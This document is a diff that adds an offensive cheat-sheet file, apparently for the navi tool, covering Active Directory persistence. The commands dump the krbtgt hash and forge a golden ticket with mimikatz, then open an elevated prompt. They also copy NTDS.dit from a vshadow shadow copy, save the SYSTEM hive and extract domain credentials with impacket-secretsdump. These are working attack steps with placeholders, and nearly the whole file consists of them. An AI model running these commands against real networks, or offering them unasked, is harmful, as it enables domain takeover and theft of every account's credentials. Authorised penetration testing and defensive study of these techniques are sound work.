@@ -1,0 +1,35 @@
+% persistence, golden ticket, active directory, mimikatz
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+; Create our own TGTs with fake permissions for any user on the domain
+; No admin privs are required to create golden tickets 
+; DCs will trust these tickets as long as they are signed with the NTLM hash of the krbtgt user
+
+# Dump krbtgt hash using mimikatz
+lsadump::lsa /patch
+
+# Create golden ticket using mimikatz & start elevated command prompt session
+kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<KRBTGT_NTLM_HASH> /ptt
+misc::cmd
+
+% persistence, shadow copies, active directory, vshadow
+@ windows-variables
+; From https://github.com/sealldeveloper/navi-cheats
+; Written by raffaele-99
+
+# Create a shadow copy of the C drive using vshadow
+vshadow.exe -nw -p  C:
+
+# Copy NTDS.dit file from a shadow copy
+copy <SHADOW_COPY_DEVICE_NAME> <DESTINATION>
+
+# Extract SYSTEM hive from registry
+reg.exe save hklm\system <DESTINATION>
+
+# Extract credentials from NTDS.dit + SYSTEM using impacket
+impacket-secretsdump -ntds <PATH_TO_NTDS> -system <PATH_TO_SYSTEM> LOCAL
+
+$ PATH_TO_NTDS: ls -p . | grep -v /
+$ PATH_TO_SYSTEM: ls -p . | grep -v /
+
